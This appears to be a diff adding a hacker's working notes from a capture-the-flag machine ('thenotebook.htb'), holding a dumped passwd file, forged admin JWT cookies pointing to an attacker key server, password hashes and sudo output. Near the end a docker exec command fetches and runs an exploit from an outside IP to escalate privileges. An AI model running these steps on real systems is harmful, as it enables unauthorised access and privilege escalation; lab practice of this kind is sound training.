@@ -1,0 +1,77 @@
+flask-based python http server
+slightly old nginx version, 1.14.0, no viable exploits though
+interesting path: /admin
+
+I can see my notes with the path
+http://thenotebook.htb/8669e314-ce51-41fa-9d5a-7db25fd1bec3/notes/522 without auth
+so if I can somehow grab the list of users I should be able to see their notes
+
+the Id of the note is by order of creation
+
+there cant be two notes with the same title
+
+Authentication cookie is JWT format
+
+potential user: noah
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false <- are we in a container or do we have containerization shit available?
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+noah:x:1000:1000:Noah:/home/noah:/bin/bash
+
+Evil cookie (old):
+auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNi43Mzo4MDgwL3BhcnJvdGtleS5rZXkifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJwYXJyb3RndXlAdGhlbm90ZWJvb2suaHRiIiwiYWRtaW5fY2FwIjp0cnVlfQ.OrqXk4qRm6hvJh_m5IuHBMTJNHT3lef0cRN3MIjIjRAFXaRfPt7gNoa7GWDAjBruoXVD7vDLa34VpPup9AL0a9fAVhOB7WvGprwZfxE4L_6esdrOH6wwA2xUItuEzmeDoP72cMcscXj2JRzImOHpdGm15VceX_iOf7bWoaBnwlOvNXbansKF3T83im89o07XAhGJ7VENfEhRP78MHHoU0wHagQMfddkD6bUrUphhwkWYJlyej8ylocyeYZ3ssGfOEzh4cBb3TvoaDMxVaw-1I5KKm383P_J3sVQ9whmBT2sbuhBDVvdPpsyxcT3uQOPA3AAmQeYkg3CmomjG5VRfpS0WAZX-Ve0zoCOGyld3wI-9UtAdSBvL03EnCT0aRapBnCmFcO8iRQ6bVuIULmpQMxzSexv99PQQ8Wrqj5lG5obUzeaXb53jyQ5ZtHFbTTIFxuptFV3iIM580R2se8aUOmrUKwxXldDdsiLkJSUPZFrvMWiy3Cyf3TAS25Hw1vWC8GDWtmKuPyeTkiBCdvx5eFrXpjpj2J0r-CJidQM1auvHnl6j8IQ_uv6Rr6D6_ehgYJr9gS5k2PE64E49bZY6N2uVIbCP3u2E5Q82oAwVGm6_I2KxFUaCZTpNadZLEee8YmLRRPew7mIDoOCmelIb0flDDzzjeX2xHHr92wpTJUg;
+
+Evil cookie (10.10.16.22):
+auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNi4yMjo4MDgwL3BhcnJvdGtleS5rZXkifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJkb2VzbnRtYXR0ZXJAdGhlbm90ZWJvb2suaHRiIiwiYWRtaW5fY2FwIjp0cnVlfQ.Rwrc5vL-BIyNCq1owfcDEa6MGlW3BARmEolaJBZXIAN4qe2FMKa4ZAHXImNxounZREg4J6AJ02xjQgJsASaPRIowwOhXss8F1tU18UwoNShG-5EwOXednavXnQM1hhgbglvxzgdj9t84SQfRWyreGwcmQoDaCuCpokBfBmWNinQ8nRKlEXlOfyDwr7Bj6nJGEUlBYbBTMiFxLeFbgW1NBnv07TVXKiOKvgyqr3hWHo3vXmwr01F3taQJz7ORlOFJLTsmBIVRZA1P_nD87I7HNBXEZxBSjgLmj0HHthCWhGeoWtc7nvr3aNWD7JHJ3NcBAyYavS2C8ECF_uK9OJhN-vspljYItgniKccc4EftDirsqSXskailxmIifvl5Xf_DgRLD0DHZyjVR-TU-aUiARaRf2kxMQsxntxq1q-qHd5D0LIp3M2DJ1EPhrdY3lf51tnvUUNJs8qGk2VmlX9e-zyh5se85rtbYpyDSmpntL_UuuJOPKXF2bzyFsQbtoQ-fxPNloxJdk-uubR19s-vG_6S-CTYzSAkWpwTtq7DSoqLHptst-yGOqhyWU0xsl4nSwnNdBFgaeQWNECv9T6S4CtDaHu9hTX1u2yrOcaKFQhKdavFDDItL4FBYVIid9yMsye7Oo5RaUvXrwNC1Y7jVgo9cXOdqHJBpWk240wUTEGY;
+
+[!] sud010 Can we list sudo commands without a password?................... yes!
+---
+Matching Defaults entries for noah on thenotebook:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User noah may run the following commands on thenotebook:
+    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+
+[*] net000 Services listening only on localhost............................ yes!
+---
+tcp    LISTEN   0        128             127.0.0.1:8080           0.0.0.0:*     
+---
+
+users = [
+        User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"),
+        User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password="e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2")
+    ]
+
+how pws are hashed: password = SHA3_256.new(request.form.get('password').encode()).hexdigest()
+
+sudo /usr/bin/docker exec -it webapp-dev01 bash -c "curl http://10.10.16.59:8080/exploit -o exploit;chmod +x exploit;./exploit"
+sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+
+35f5f2613a67e3915f349e0af724f4e4
